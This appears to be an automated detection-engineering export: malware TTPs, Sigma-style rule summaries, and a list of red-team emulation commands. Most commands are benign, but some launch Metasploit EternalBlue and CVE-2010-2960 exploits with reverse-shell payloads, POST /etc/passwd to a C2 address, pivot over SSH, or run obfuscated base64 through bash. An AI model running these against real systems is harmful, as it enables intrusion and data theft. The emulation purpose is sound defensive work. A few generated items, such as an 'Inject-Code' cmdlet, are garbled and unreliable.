extracted_ttps.description: The malware uses PowerShell to execute scripts and load modules

The malware generates a hidden file with an MZ-PE loader and registers it in the Windows registry for persistence
Detected PowerShell activity via NLP pattern matching

The malware employed a custom EternalBlue SMBv1 exploit to infiltrate its victims' systems
Malware collects system information and transmits it to the C2 server
The attackers collected data from the local system
The malware relies on user-level privileges when delivered via the Cygwin SSH server
The malware uses SSH protocol for propagation within the local network
The attackers used EternalBlue exploit to gain initial access to the system
The attackers exfiltrated data over a C2 channel
The malware includes a command capable of obtaining the active X11 display on Linux

Malware uses EternalBlue exploit to infect remote systems
The attackers used the 'net' command to discover application windows
The attackers used resource hijacking to mine cryptocurrency
The malware collects sensitive information from all active users

Malware hijacks system resources for cryptocurrency mining

Malware uses social engineering to trick users into installing the malware

rules.title: PowerShell Execution with Encoded Commands and Invoke-Expression
rules.description: Detects PowerShell or certutil usage to execute encoded PowerShell scripts or Invoke-Expression, a common behavior of malicious actors.

detection.condition: (selection_powershell and (selection_invexp or selection_encoded) and selection_parent) or (selection_certutil and selection_parent)

falsepositives: Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment
System administrators using certutil -decode for legitimate file decoding
Automation tools that invoke PowerShell via cmd.exe or wscript.exe

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Registry Run Key Persistence with Hidden PE File Creation
rules.description: Detects attempts to establish persistence via Windows Registry Run keys combined with creation of hidden MZ-PE executable files in user directories such as %APPDATA%.
falsepositives: Legitimate applications adding startup entries in Run keys
System utilities or installers creating hidden files in AppData
User-initiated scripts or tools that modify Run keys for configuration

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious PowerShell Execution with Encoding Flags
rules.description: Detects PowerShell execution with suspicious command line encoding/obfuscation arguments, excluding common legitimate paths
falsepositives: Legitimate administrative scripts using encoded commands
Enterprise management software (e.g., SCCM, Azure automation)
PowerShell development/testing activities

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Encrypted Channel via Custom TOR Client
rules.description: Detects the use of a custom TOR client for command and control communication
falsepositives: Legitimate TOR browser usage
TOR-enabled applications

siem_verification.message: Verification complete

rules.title: Suspicious Process Execution Indicating EternalBlue SMBv1 Exploit Attempt
rules.description: Detects process executions that contain indicators related to the EternalBlue exploit targeting SMBv1, often used in initial access attacks.
falsepositives: Penetration testing activities involving EternalBlue for vulnerability assessment
Security research tools or exploit development environments referencing EternalBlue in commands

siem_verification.message: Verification complete

rules.title: System Information Discovery via Command Line Utilities
rules.description: Detects common system information discovery commands executed via cmd.exe, powershell.exe, wmic.exe, or reg.exe

detection.condition: selection1 or selection2 or selection3 or selection4

falsepositives: Legitimate system administration scripts
Inventory management tools
Help desk troubleshooting procedures

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Collection of Local Files with Encoding and Suspicious Parent Processes
rules.description: Detects processes that access specific local data files (delta.dat, delta.img, ota.dat, ota.img) and optionally encode the data using PowerShell or certutil, or are launched by suspicious parent processes such as rundll32.exe or wmic.exe.

detection.condition: ((delta_dat or delta_img or ota_dat or ota_img) and (powershell_enc or certutil_decode)) or parent_rundll32

falsepositives: Legitimate administrative scripts that read or copy the listed files.
System maintenance tools that use certutil.exe for certificate handling.
Internal PowerShell scripts that employ -EncodedCommand for automation.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detect User Execution of Encoded Payloads via Cygwin SSH Server
rules.description: Detects execution of potentially malicious encoded commands launched by the Cygwin SSH server (sshd.exe) using common Windows execution utilities such as PowerShell, cmd.exe, wscript.exe, cscript.exe, rundll32.exe, wmic.exe, and certutil.exe.

detection.condition: parent_sshd and (powershell_enc or powershell_enc_short or certutil_decode or cmd_base64 or wscript_base64 or cscript_base64 or rundll32_base64 or wmic_base64)

falsepositives: Legitimate administrators using PowerShell with -EncodedCommand for automation
System administrators using certutil -decode for legitimate file decoding
Scripts that invoke rundll32.exe or wmic.exe for standard system tasks
Scheduled tasks or maintenance scripts that run cmd.exe with long base64 strings for configuration

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: SSH Client Usage for Lateral Movement
rules.description: Detects SSH client execution with command-line arguments suggesting lateral movement within the network.
falsepositives: Legitimate administrative SSH connections
Automated scripts using SSH for remote management

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: C2 Exfiltration via Specified Onion Services
rules.description: Detects outbound connections to known malicious Tor hidden services used for C2 channel exfiltration
falsepositives: Legitimate Tor traffic accessing the specified onion services, though this is unlikely in most enterprise environments

siem_verification.message: Verification complete

attacks.description: Basic command that executes a simple script to write the current date to a file
attacks.expected_behavior: The command will create a file named date.txt in the $env:TEMP directory containing the current date

attacks.description: Intermediate command that loads the PSReadLine module and retrieves its options
attacks.expected_behavior: The command will load the PSReadLine module and display its options

attacks.description: Advanced command that uses an encoded command to write a string to a file
attacks.expected_behavior: The command will create a file named hello.txt in the $env:TEMP directory containing the string 'Hello world'

attacks.description: Basic command to execute a PowerShell script that gets the current date
attacks.expected_behavior: The command will output the current date and time.

attacks.description: Intermediate command to load a PowerShell module and execute a function
attacks.expected_behavior: The command will load the PSUtilities module and output the version number.

attacks.description: Advanced command to execute a PowerShell script that handles errors
attacks.expected_behavior: The command will attempt to remove a file and output an error message if it fails.

attacks.description: Adds a cron job to execute a script at system reboot
attacks.expected_behavior: A cron job is installed for the current user to run a local script after each reboot. The script path is hypothetical and will not execute unless created

attacks.description: Appends a conditional execution of a hidden script to the user's shell profile
attacks.expected_behavior: On each new shell session, the user's .bashrc checks for the existence of .persistent and executes it if present. No actual payload is dropped

attacks.description: This command uses PowerShell to get a list of all running processes on the system.
attacks.expected_behavior: The command will execute and return a list of all running processes on the system.

attacks.description: This command uses PowerShell to download a file from a website and save it to the temp directory.
attacks.expected_behavior: The command will execute and download the file from the website, saving it to the temp directory.

attacks.description: This command uses PowerShell to compress a file in the temp directory and save it as a zip file.
attacks.expected_behavior: The command will execute and compress the file, saving it as a zip file in the temp directory.

attacks.description: Basic command to get a list of running processes using PowerShell on Linux.
attacks.expected_behavior: Lists running processes.

attacks.description: Intermediate command to create a file using PowerShell on Linux, demonstrating file operations with -Force.
attacks.expected_behavior: Creates a file named testfile.txt in /tmp with the content 'Hello World'.

attacks.description: Advanced command to download a webpage using PowerShell on Linux, assuming internet access.
attacks.expected_behavior: Downloads the webpage http://example.com and saves it as example.html in /tmp.

attacks.description: Basic: Establish a local TCP connection using PowerShell
attacks.expected_behavior: A local TCP connection is established

attacks.command: powershell -Command "Add-Type -AssemblyName System.Net.Security; $sock = New-Object System.Net.Sockets.TcpClient; $sock.Connect('127.0.0.1', 8080); $stream = $sock.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine('Hello, TOR client!'); $writer.Flush()"
attacks.description: Intermediate: Send a message through the local TCP connection using PowerShell
attacks.expected_behavior: A message is sent through the local TCP connection

attacks.command: powershell -Command "mkdir '$env:TEMP\TOR_Client' -ErrorAction SilentlyContinue; Set-Content -Path '$env:TEMP\TOR_Client\config.txt' -Value 'Simulated TOR client configuration'"
attacks.description: Advanced: Create a simulated TOR client directory and configuration file using PowerShell
attacks.expected_behavior: A simulated TOR client directory and configuration file are created

attacks.description: Establish a TOR connection using a temporary data directory
attacks.expected_behavior: A TOR connection is established using a temporary data directory

attacks.description: Use curl to test the TOR connection
attacks.expected_behavior: The TOR connection is tested using curl

attacks.description: Establish a TOR connection with a hashed control password
attacks.expected_behavior: A TOR connection is established with a hashed control password

attacks.description: Scan for SMB service status to identify potential vulnerability
attacks.expected_behavior: Lists the status of the SMB service

attacks.description: Attempt to establish a connection to the SMB service on the local machine
attacks.expected_behavior: Attempts to connect to the SMB service on the local machine

attacks.description: Create a test file and attempt to invoke it, simulating a potential exploit
attacks.expected_behavior: Creates a test file and attempts to open it

attacks.command: msfconsole -q -x 'use exploit/linux/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set PAYLOAD generic/shell_reverse_tcp; set LHOST 192.168.1.10; exploit'
attacks.description: Basic EternalBlue SMBv1 exploit launch using Metasploit framework against a single target
attacks.expected_behavior: Metasploit loads the EternalBlue exploit module, configures target and listener, then attempts exploitation. On success, returns a shell session.

attacks.description: Intermediate: Base64-encoded Metasploit EternalBlue exploit execution in background with logging
attacks.expected_behavior: Decodes and runs the Metasploit exploit command asynchronously. Output and errors are logged to /tmp/.exploit.log. Simulates stealthier execution.

attacks.description: Gathers basic system information
attacks.expected_behavior: Displays system information in the command prompt

attacks.description: Uses PowerShell to gather detailed system information
attacks.expected_behavior: Displays detailed system information in the PowerShell console

attacks.description: Saves network configuration to a file
attacks.expected_behavior: Creates a file named system_info.txt in the temporary directory containing network configuration details

attacks.description: List all files in /tmp directory to discover potentially sensitive data left by users or applications
attacks.expected_behavior: Outputs detailed list of files and permissions in /tmp; no modification to system state

attacks.description: Collect running processes and local user accounts, appending both to a single file for data aggregation
attacks.expected_behavior: Creates /tmp/process_list.txt containing process list and local user information; no network transmission occurs

attacks.description: Archive collected system data into a compressed file, simulating preparation for exfiltration
attacks.expected_behavior: Creates a compressed archive /tmp/system_data.tar.gz containing system data; avoids self-inclusion via exclude

attacks.description: Basic command to create a file in the temp directory
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Hello World'

attacks.description: Intermediate command to display a message box using PowerShell
attacks.expected_behavior: Displays a message box with the content 'Hello World'

attacks.description: Advanced command to create a directory and file in the temp directory
attacks.expected_behavior: Creates a directory named test in the temp directory and a file named test.txt inside it with the content 'Hello World'

attacks.description: Execute a benign script
attacks.expected_behavior: The script will execute and print a message to the console

attacks.description: Execute a script with arguments
attacks.expected_behavior: The script will execute with the provided arguments and print a message to the console

attacks.description: Execute a script that requires user input
attacks.expected_behavior: The script will execute and read input from the file input.txt

attacks.description: Basic SSH connection to remote host to execute a command
attacks.expected_behavior: Attempts to connect via SSH to 192.168.1.100 as 'user', executes 'id' command. Suppresses host key prompts and limits connection timeout. Outputs user identity if connection succeeds.

attacks.command: echo '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED_KEY]\n-----END OPENSSH PRIVATE KEY-----' > $HOME/.ssh/id_test && chmod 600 $HOME/.ssh/id_test && ssh -i $HOME/.ssh/id_test -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@192.168.1.100 'hostname' && rm -f $HOME/.ssh/id_test
attacks.description: Intermediate SSH connection using injected private key for authentication
attacks.expected_behavior: Creates a temporary SSH private key file, sets correct permissions, uses it to authenticate to remote host, runs 'hostname', then removes the key file. Simulates credential dumping and reuse.

attacks.command: ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -L 8080:192.168.2.100:80 user@192.168.1.100 'echo Pivoting through host; sleep 60'
attacks.description: Advanced SSH connection with local port forwarding to pivot into a segmented network
attacks.expected_behavior: Establishes SSH connection with local port 8080 forwarded to 192.168.2.100:80 through the remote host. Allows attacker to access internal services via tunnel. Runs a benign message and sleeps for 60 seconds to keep tunnel open.

attacks.description: Listen on port 8080 and save received data to a file
attacks.expected_behavior: Data sent to the specified port will be saved to the exfiltrated_data.txt file

attacks.description: Compress a file, encode it, and save it to a new file
attacks.expected_behavior: The test.txt file will be compressed, encoded, and saved as encoded_test.txt

attacks.description: Encode a file using certutil and send it over a network connection
attacks.expected_behavior: The encoded file will be sent to the specified server and port

attacks.description: Basic exfiltration: creates a small test file and sends it via HTTP POST using curl
attacks.expected_behavior: Creates /tmp/exfil_data.txt and attempts to upload it to the specified HTTP endpoint. Fails silently if the server is unreachable.

attacks.command: tar -czf /tmp/system_info.tgz /etc/passwd /etc/group 2>/dev/null && curl -s -X POST -H 'Content-Type: application/gzip' --data-binary @/tmp/system_info.tgz http://10.0.0.5:443/collect || echo 'Exfil failed, continuing'
attacks.description: Intermediate exfiltration: packages sensitive system files into a compressed archive and sends via HTTPS
attacks.expected_behavior: Creates a compressed tarball of /etc/passwd and /etc/group, then attempts to upload it to the C2 server. Uses minimal noise with suppressed curl output.

attacks.description: Lists all windows in a tree hierarchy under the root window using xwininfo
attacks.expected_behavior: Outputs a hierarchical list of all top-level and child windows currently managed by the X server

attacks.description: Lists all open windows with their window IDs and titles using wmctrl
attacks.expected_behavior: Displays a flat list of windows, showing window handle, desktop ID, client machine, and window title

attacks.description: Lists all X11 client applications currently connected to the display with detailed information
attacks.expected_behavior: Shows detailed information about each connected X11 client, including command name, window title, and window ID

attacks.description: Basic: Exploit CVE-2010-2960 vulnerability using Metasploit
attacks.expected_behavior: Successful exploitation of the vulnerability, leading to remote code execution on the target system

attacks.command: sudo msfconsole -q -x "use exploit/linux/local/cve_2010_2960; set RHOSTS 192.168.1.100; set LPORT 4444; exploit"
attacks.description: Intermediate: Exploit CVE-2010-2960 vulnerability with specified LPORT using Metasploit
attacks.expected_behavior: Successful exploitation of the vulnerability, leading to remote code execution on the target system with specified LPORT

attacks.command: sudo msfconsole -q -x "use exploit/linux/local/cve_2010_2960; set RHOSTS 192.168.1.100; set LPORT 4444; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit"
attacks.description: Advanced: Exploit CVE-2010-2960 vulnerability with specified LPORT and payload using Metasploit
attacks.expected_behavior: Successful exploitation of the vulnerability, leading to remote code execution on the target system with specified LPORT and payload

attacks.description: Lists all application windows in a hierarchical tree format from the root window using xwininfo
attacks.expected_behavior: Outputs a tree of all top-level and child windows currently managed by the X server

attacks.description: Lists all open application windows with their window IDs and titles using wmctrl
attacks.expected_behavior: Displays a list of windows currently managed by the window manager, including desktop, title, and process info if available

attacks.description: Lists all client applications currently connected to the X server with detailed information
attacks.expected_behavior: Shows detailed information about each client application with open windows, including command path and window IDs

attacks.description: Simulates a resource-intensive mining process by compressing infinite zero data in the background.
attacks.expected_behavior: Starts a background process that compresses /dev/zero output, consuming CPU and some disk I/O. Process runs until manually stopped or system reboot.

attacks.command: sh -c 'while true; do dd if=/dev/urandom bs=1M count=100 | sha256sum > /dev/null; done' &
attacks.description: Runs a loop of hash computations on random data to simulate cryptocurrency mining workload.
attacks.expected_behavior: Infinite loop performing SHA-256 hashing on 100MB chunks of random data, consuming significant CPU. Runs in background and persists across session unless killed.

attacks.description: Executes a hypothetical cryptocurrency miner binary with stealth flags and background persistence.
attacks.expected_behavior: Assumes /tmp/.miner exists and is executable. Runs miner with nohup to survive session logout. Simulates real-world miner deployment post-compromise. Actual mining does not occur due to fake pool and missing binary.

attacks.description: Basic command to execute a simple PowerShell script that writes the current date to a file in the temp directory.
attacks.expected_behavior: A file named date.txt will be created in the temp directory with the current date.

attacks.description: Intermediate command that executes an encoded command (in this case, a simple echo statement) using the call operator (&).
attacks.expected_behavior: The string 'Hello World' will be printed to the console.

attacks.description: Advanced command that loads the System.Windows.Forms assembly and displays a message box using PowerShell.
attacks.expected_behavior: A message box will appear with the text 'This is a test'.

attacks.description: Basic command execution using bash to create a file
attacks.expected_behavior: Creates a file named test.txt in /tmp with the content 'Hello'

attacks.command: bash -c 'for i in {1..5}; do echo $i > /tmp/test_$i.txt; done'
attacks.description: Intermediate command execution using a for loop in bash to create multiple files
attacks.expected_behavior: Creates five files named test_1.txt to test_5.txt in /tmp with their respective numbers as content

attacks.description: Advanced command execution creating, making executable, and running a bash script
attacks.expected_behavior: Creates a script named advanced_script.sh in /tmp, makes it executable, and then runs it, printing 'Advanced Scripting' to the console

attacks.description: Download a script via wget, make it executable, and run it — simulating a user tricked into running a system update.
attacks.expected_behavior: Downloads a script from a remote server, sets execute permission, and runs it in the user context. Simulates post-phishing execution.

attacks.description: Pipe a remotely fetched script directly into bash for execution — a common phishing method disguised as an installer.
attacks.expected_behavior: Fetches a script from a remote URL and executes it immediately without saving to disk. Simulates drive-by script execution via phishing link.

attacks.description: Execute a base64-encoded benign script from stdin to simulate an encoded payload delivered via phishing email or link.
attacks.expected_behavior: Decodes a base64 string containing a simple bash script and executes it in memory. Simulates obfuscated payload execution common in phishing attacks.

attacks.description: Lists all running services, which can be used to identify potential system processes to modify or create.
attacks.expected_behavior: Displays a list of all running services on the system.

attacks.description: Creates a new service named MyService that executes svchost.exe, demonstrating the creation of a system process.
attacks.expected_behavior: Creates a new service named MyService that can be started or stopped like any other system service.

attacks.description: Uses PowerShell to start a new cmd.exe process that executes a benign command, demonstrating process creation.
attacks.expected_behavior: Opens a new command prompt window that executes the command 'echo Hello World!' and then closes.

attacks.description: Start the SSH service to demonstrate creating a system process
attacks.expected_behavior: The SSH service will start, allowing remote connections.

attacks.description: Modify the cron table to demonstrate modifying a system process
attacks.expected_behavior: The cron table will be opened in the default editor, allowing modifications.

attacks.description: Enable the SSH service to start at boot, demonstrating persistence
attacks.expected_behavior: The SSH service will be enabled to start at boot, ensuring persistence.

attacks.command: powershell -Command "& {Start-Process notepad.exe -WindowStyle Hidden; Start-Sleep -s 2; Get-Process notepad | Inject-Code}"
attacks.description: Inject code into a running notepad.exe process using PowerShell. This command starts notepad, waits for it to load, and then attempts to inject code into it.
attacks.expected_behavior: Notepad will start in the background, and an attempt will be made to inject code into it, which may or may not succeed depending on the system's security configuration.

attacks.description: Use rundll32 to invoke a function from user32.dll, which could potentially be used for process injection by exploiting vulnerabilities in the DLL or its functions.
attacks.expected_behavior: The system will produce a beep sound, indicating the successful invocation of the MessageBeep function from user32.dll.

attacks.command: powershell -Command "& {Add-Type -MemberDefinition '[DllImport("kernel32")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);' -Name Utku -Namespace Wut; [Wut.Utku]::OpenProcess(0x1F0FFF, $false, 1234)}"
attacks.description: Attempt to open a process with a specific ID using PowerShell, which involves P/Invoke to call the OpenProcess function from kernel32.dll. This could be a step in process injection.
attacks.expected_behavior: The command attempts to open a process with ID 1234, which may succeed or fail based on the existence of the process and the caller's permissions.

attacks.description: Basic Process Injection using gdb to attach to a running bash process and allocate memory
attacks.expected_behavior: The command will attach to a running bash process and allocate memory, demonstrating basic Process Injection

attacks.description: Intermediate Process Injection using bash to create a new process and inject code into it
attacks.expected_behavior: The command will create a new bash process and inject code into it, demonstrating intermediate Process Injection

attacks.description: Advanced Process Injection using gdb to attach to a running bash process, allocate memory, and inject code into it
attacks.expected_behavior: The command will attach to a running bash process, allocate memory, and inject code into it, demonstrating advanced Process Injection

attacks.description: Basic obfuscation using Base64 encoding of a simple echo command, decoded and executed via pipe.
attacks.expected_behavior: Decodes the Base64 string 'echo 'This is a test'' and executes it, printing 'This is a test' to stdout.

attacks.description: Intermediate obfuscation: decodes a Base64 payload into a temporary script file, executes it, and deletes it.
attacks.expected_behavior: Creates a hidden script in the user's cache directory containing a benign message, runs it (outputs text), then removes the file.

attacks.command: a=ZWNobyAgJ; b=1; c=2; d=OyBlY2hvICI; e=Obfuscated; f= Step; g= $b$c"; h=ICQ7; i=base64 -d <<< "$a$e$f$g$h" | bash
attacks.description: Advanced obfuscation using split Base64 string across multiple variables and concatenation to hide encoded command.
attacks.expected_behavior: Reconstructs a Base64 string from multiple variables, decodes and executes it, outputting a versioned benign message like 'echo 12 $;' followed by execution (which prints '12 $;' if run).

attacks.description: Lists all started services on the local machine
attacks.expected_behavior: Lists running services

attacks.description: Displays a list of resources on the local machine or network
attacks.expected_behavior: Lists available network resources

attacks.description: Displays active connections, routing tables, and interface statistics
attacks.expected_behavior: Lists network connections and listening ports

attacks.description: Perform a TCP SYN scan on a range of IPs to discover open ports and services
attacks.expected_behavior: Identify open ports and infer services running on them

attacks.description: List all listening network services and their corresponding PIDs and program names
attacks.expected_behavior: Display a list of listening services and their details

attacks.description: Use netcat to scan a target IP for open ports from 1 to 1024
attacks.expected_behavior: Report open ports on the target IP

attacks.description: Basic command to archive a collected file using Compress-Archive.
attacks.expected_behavior: Creates an archive of a test file in the temp directory.

attacks.description: Intermediate command demonstrating archiving collected directory listing and then cleaning up the archive file.
attacks.expected_behavior: Archives the contents of the temp directory and then attempts to delete the archive.

attacks.command: powershell -Command "mkdir '%TEMP%\collected_data' -ErrorAction SilentlyContinue; Set-Content -Path '%TEMP%\collected_data\info.txt' -Value 'Test Data'; Compress-Archive -Path '%TEMP%\collected_data\*' -DestinationPath '%TEMP%\advanced_archive.zip' -Force; Remove-Item '%TEMP%\collected_data' -Recurse -ErrorAction SilentlyContinue"
attacks.description: Advanced command creating a directory, collecting data into a file, archiving it, and then cleaning up.
attacks.expected_behavior: Creates a directory, adds a file to it, archives the directory contents, and then removes the directory and its contents.

attacks.description: Basic archiving of data using tar
attacks.expected_behavior: Creates a compressed archive named archive.tar.gz containing data from /path/to/data

attacks.description: Intermediate archiving using zip for recursive directory compression
attacks.expected_behavior: Creates an archive named archive.zip containing all files and subdirectories from /path/to/data

attacks.description: Advanced archiving by individually compressing files using gzip
attacks.expected_behavior: Compresses each file in /path/to/data individually using gzip

attacks.description: Captures the clipboard contents (if an image) and saves it as a screenshot in the temp directory using mspaint.
attacks.expected_behavior: The command captures the current screen or clipboard image and saves it to the temp directory.

attacks.description: Uses PowerShell to capture the screen and save it as a PNG file in the temp directory.
attacks.expected_behavior: The command captures the entire virtual screen and saves it as a PNG image in the temp directory.

attacks.command: powershell -Command "$signature = @';[DllImport("user32.dll")] public static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);'; Add-Type -MemberDefinition $signature -Name APISetWindow -PassThru | Out-Null; Add-Type -AssemblyName System.Windows.Forms; $hwnd = (Get-Process -Id $PID).MainWindowHandle; $bmp = New-Object System.Drawing.Bitmap 400, 300; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $hdc = $gfx.GetHdc(); [APISetWindow]::PrintWindow($hwnd, $hdc, 0); $gfx.ReleaseHdc($hdc); $bmp.Save('%TEMP%\window_capture.png');"
attacks.description: Advanced PowerShell command to capture a specific window (in this case, the current PowerShell window) and save it as a PNG.
attacks.expected_behavior: Captures the current PowerShell window and saves it as a PNG image in the temp directory.

attacks.description: Takes a full-screen screenshot using scrot and saves it to /tmp/screenshot.png
attacks.expected_behavior: Captures the entire screen and saves it as PNG in /tmp. No user interaction required if scrot is installed.

attacks.description: Captures the root window after a 2-second delay with frame using ImageMagick's import tool
attacks.expected_behavior: Waits 2 seconds, then captures the full desktop including window decorations. Saves as JPEG in /tmp. Requires ImageMagick.

attacks.description: Takes a screenshot using gnome-screenshot and encodes it in Base64 for potential exfiltration
attacks.expected_behavior: Captures screen to file, then converts it to Base64 and stores in a temporary text file. Simulates preparation for data transfer.
